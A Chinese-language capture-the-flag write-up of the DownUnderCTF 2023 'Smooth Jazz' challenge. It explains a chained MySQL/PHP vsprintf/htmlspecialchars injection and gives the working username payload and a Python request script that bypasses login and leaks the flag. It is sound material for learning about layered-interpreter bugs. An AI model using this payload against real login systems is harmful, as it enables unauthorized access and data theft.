# DownUnderCTF 2023 Smooth Jazz Writeup

## 题目简述

登录页混合使用 MySQL、PHP `vsprintf()` 和 `htmlspecialchars()`。用户名先经过一次 `%s` 格式化查询，随后又被直接拼入第二个格式字符串；登录成功后，经 HTML 转义的用户名还会第三次进入 `vsprintf()`。

完整利用链包含三种解析差异：无效 UTF-8 让首个用户查询匹配 `admin`，受控 SHA-1 前缀经 `%c` 生成 SQL 引号，最后再利用 HTML 实体编码改变 PHP 格式串的语法，使普通用户问候模板读取本应只在管理员分支显示的第二个参数——flag。

## 解题过程

用户名只转义双引号和反斜杠，密码则被计算 SHA-1：

```php
$username = strtr($_POST['username'], ['"' => '\\"', '\\' => '\\\\']);
$password = sha1($_POST['password']);
```

选择密码 `668`，其摘要为：

```text
34c66477519b949b09b45e131347c17b5822a30a
```

当该字符串作为 `vsprintf()` 的数值参数使用时会转换成 34，而 ASCII 34 正是双引号。于是用户名中的 `%1$c` 能在第二条查询格式化时动态产生 `"`。

首条查询的格式串本身固定，用户名只是 `%s` 的参数，参数内部的百分号不会被再次解释。用户名使用 `admin\xff...`；在题目所用 MySQL 字符集处理路径中，无效 UTF-8 字节使后续内容不参与有效比较，首条查询仍能找到 `admin`。

第二条查询在调用 `vsprintf()` 前已经把用户名拼入格式串：

```php
'SELECT * FROM users WHERE username = "'.$username.'" AND password = "%s"'
```

因此 `%1$c||1#` 会变成 `"||1#`：双引号闭合用户名，`||1` 令条件为真，`#` 注释掉余下密码检查。

仍有最后一个障碍。程序只有在 `$username === "admin"` 时才把 flag 直接放进问候格式，但注入用户名不可能通过严格相等比较。普通分支看似只有一个 `%s`：

```php
$greeting = "Hello $htmlsafe_username, the server time is %s";
$message = vsprintf($greeting, [date('Y-m-d H:i:s'), getenv('FLAG')]);
```

注意参数数组实际仍有两个元素，第二个就是 flag。需要构造一段格式串，使它在 SQL 查询阶段不引用不存在的第二参数，而经 `htmlspecialchars()` 后才变成 `%2$s`。可用字节序列为：

```text
%1$'>%2$s
```

在 HTML 转义前，`%1$'>%` 被解析为使用第一个参数、以 `>` 为自定义填充字符的百分号转换，后面的 `2$s` 只是文本，不会索引第二参数。转义后，`>` 变成 `&gt;`，字符串成为 `%1$'&gt;%2$s`：前半段现在以 `g` 作为浮点转换类型，`t;` 是普通文本，末尾 `%2$s` 成为独立格式说明符并输出 flag。

完整请求如下，用户名必须按原始字节发送：

```python
import requests

payload = {
    "username": b"admin\xff%1$c||1#%1$'>%2$s",
    "password": "668",
}
response = requests.post("http://TARGET/", data=payload)
print(response.text)
```

响应问候中泄露：

```text
DUCTF{at_least_you_can_enjoy_the_jazz}
```

页面附带的爵士乐 MP3 只是提示和装饰，不携带解题数据，因此未复制到图片资源目录。

## 方法总结

本题不是单一 SQL 注入，而是一条跨解释器链：同一用户名依次由 MySQL、PHP 格式化函数和 HTML 编码器解释。构造 payload 时必须同时满足三个阶段的语法约束。尤其值得注意的是，安全编码可能改变后续解释器看到的 token 边界；把已编码字符串再次当格式模板使用，会让原本无害的文本重新获得控制语义。
